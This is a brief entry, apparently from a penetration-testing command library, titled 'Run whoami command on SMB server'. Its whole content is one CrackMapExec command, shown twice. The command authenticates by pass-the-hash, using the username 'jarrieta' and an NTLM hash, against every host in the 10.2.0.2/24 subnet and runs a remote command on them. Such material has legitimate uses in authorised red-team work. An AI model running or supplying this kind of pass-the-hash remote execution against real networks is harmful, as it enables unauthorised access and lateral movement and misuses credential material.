---
id: 47c36e1c-f8a1-4058-94f9-67a92ee0b791
name: Run whoami command on SMB server
type: command
executor: bash
data: cme smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d'
  -x "whoami"
output: null
created_at: '2023-04-06T03:56:05.079548+00:00'
updated_at: '2023-04-10T20:25:57.045841+00:00'
---

# Run whoami command on SMB server

```bash
cme smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
```


